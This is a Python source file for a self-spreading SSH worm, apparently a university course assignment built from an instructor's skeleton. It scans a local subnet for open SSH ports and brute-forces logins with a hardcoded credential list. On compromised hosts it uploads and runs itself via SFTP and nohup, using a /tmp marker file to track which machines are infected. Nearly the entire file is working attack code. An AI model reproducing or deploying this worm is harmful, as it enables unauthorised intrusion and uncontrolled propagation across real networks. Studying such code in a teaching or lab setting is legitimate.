import paramiko
import sys
import socket
import nmap
import netinfo
import os
import netifaces
import fcntl
import struct

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################

def isInfectedSystem():
	
	# Check if the system is infected.  One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected).
	return os.path.exists(INFECTED_MARKER_FILE)
	
##################################################################
# Marks the system as infected
##################################################################

def markInfected():
	
	# Mark the system as infected.  One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	
	# Open a file and indicate what to do with the file
	# r = read, w = write
	fileObject = open(INFECTED_MARKER_FILE, "w")
	
	# Write text into the file
	fileObject.write("Mikhail Gofman is at fault for this...")
	
	# Close the file
	fileObject.close()	

##################################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
##################################################################

def spreadAndExecute(sshClient):
	
	# This function takes as a parameter
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system.  The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# exectue itself.  Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.
	
	# We are going to create an instance of SFTP class
	# This is used for uploading/downloading files and
	# executing commands
	newSshClient = sshClient.open_sftp()
	
	# Copy the worm onto the remote system
	newSshClient.put("/tmp/replicator_worm.py", "/tmp/replicator_worm.py")
	
	# Make the worm file executable
	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
	
	# Execute the worm
	# nohup - keeps the worm running after we disconnect
	# python - the python interpreter
	# /tmp/replicator_worm.py - the worm script
	# & - keep in background
	sshClient.exec_command("nohup python /tmp/replicator_worm.py >/tmp/error.log &")
	
##################################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
##################################################################

def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host using 
	# the username stored in variable userName
	# and password stored in variable password
	# and instnace of SSH class sshClient.
	# If the server is down or has some other
	# problem, connect() fucntion which you will
	# be using will throw socket.error exception.
	# Otherwise, if the credentials are not
	# correct, it will throw
	# paramiko.SSHException exception.
	# Otherwise, it opens a connection 
	# to the victim system; sshClient now
	# represents an SSH connection to the
	# victim.  Most of the code here will
	# be almost identical to what we did
	# during class exercise.  Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	
	#connectStatus = 0
	
	# We are going to try to connect to the host using
	# the provided username and password
	try:
		sshClient.connect(host, username = userName, password = password)
		#connectStatus = 0
		print "\nConnection successful..."
		return 0
	
	# Exception to catch error of incorrect credentials
	#except paramiko.ssh_exception.AuthenticationException:
	except paramiko.SSHException:
		#connectionStatus = 1
		print "Wrong credentials!"
		return 1
	
	# Exception to catch error of downed server 
	# or server not running SSH
	except socket.error:
		#connectionStatus = 3
		print "The server is down or not running SSH"
		return 3
	
	#return connectStatus
		
	
##################################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instance of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
##################################################################

def attackSystem(host):
	
	count = 0
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()
	
	# Set some parameters to make things easier
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
	
	# Display the IP address we are attempting to infiltrate
	print "\nAttempting to connect to " + host
	
	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim.  In this case we will 
		# return a tuple containing an 
		# instance of the SSH connection
		# to the remote system.
		
		# Set variable connectStatus equal to
		# function tryCredentials.  If the value
		# return is 0, successful connection.
		# Value of 1 is wrong credentials.
		# Value of 3 is server down
		connectStatus = tryCredentials(host, username, password, ssh)
		#print "connectStatus: ", connectStatus
		# If tryCredentials returns a 0
		# we have successfully compromised
		# the victim
		if connectStatus == 0:
			attemptResults = ssh
			#attemptResults = connectStatus[0]
		
		elif connectStatus == 3:
			break
			
		else:
			count += 1
			if count == 4:
				print "Unable to connect to host"
		
	# Return working credentials
	return attemptResults
	
##################################################################
# Returns the IP of the current system
# @param interface -  the interface whose IP we would
# like to know
# @return - The IP address of the current system
##################################################################

def getMyIP():
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	
	# Get all network interfaces on the system
	networkInterfaces = netifaces.interfaces()
	
	# The IP address
	ipAddr = None
	
	# Go through all interfaces
	for netFace in networkInterfaces:
		
		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr']
		
		# Get the IP address
		if not addr == "127.0.0.1":
			
			# Save the IP address and break
			ipAddr = addr
			break
	
	return ipAddr
	
##################################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
##################################################################

def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered 
	# IP addresses.
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there).
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
	
	# Scan the network for hosts
	#hostInfo = portScanner.all_hosts()
	
	# The list of hosts that are up
	#liveHosts = []
	
	# Go through all the hosts return by nmap
	# and remove all who are not up and running
	#for host in hostInfo:
		
		# Is this host up?
	#	if portScanner[host].state() == "up":
	#		liveHosts.append(host)
	
	#return liveHosts
	return portScanner.all_hosts()
	
# If we are being run without a command line parameters,
# then we assume we are executing on a victim system and
# will act maliciously.  This way, when you initially run the
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciusly
# on the attackers system.  If you do not like this approach,
# an alternative approach is to hardcode the origin system's 
# IP address and have the worm check the IP of the current
# system against the hardcoded IP.

if len(sys.argv) < 2:
	
	# TODO: If we are running on the victim, check if 
	# the victim was already infected.  If so, termintate.
	# Otherwise, proceed with malice.
	if isInfectedSystem() == True:
		print "\nHost is infected\n"
		exit()
		
	else:
		print "\nProceeding with malice..."
		markInfected()
	
# TODO: Get the IP of the current system
currentSystemIP = getMyIP()

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system 
# from the list of discovered systems (we
# do not want to target ourselves!).
if currentSystemIP in networkHosts:
	networkHosts.remove(currentSystemIP)

print "\nFound hosts: ", networkHosts

# If statement to exit program if no hosts found
if len(networkHosts) == 0:
	print "\nNo hosts found!\nTerminating program...\n"
	exit()

# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo = attackSystem(host)
	
	#print "Trying to attack host ", host
	#print sshInfo
	
	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
		
		# TODO: Check if the system was
		# already infected.  This can be
		# done by checking whether the
		# remote system contains /tmp/infected.txt
		# file (which the worm will place there
		# when it first infects the system)
		# This can be done using code similar to
		# the code below:
		
		try:
			remotepath = INFECTED_MARKER_FILE
			localpath = '/home/cpsc/infected.txt'
			
		#		# copy the file from the specified 
		#		# remote path to the specified
		# 		# local path.  If the file does exist
		#		# at the remote path, the get()
		#		# will throw IOError exception
		#		# (that is, we know the system is
		#		# not yet infected).
			
			print "Creating instance"
			newSftpClient = sshInfo.open_sftp()
			print "Fetching"
			newSftpClient.get(remotepath, localpath)
			print "The host is already infected"
			
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system	
		except IOError:
			print "This system should be infected..."
			spreadAndExecute(sshInfo)
			print "Spreading complete!\n"
			exit()

print ""
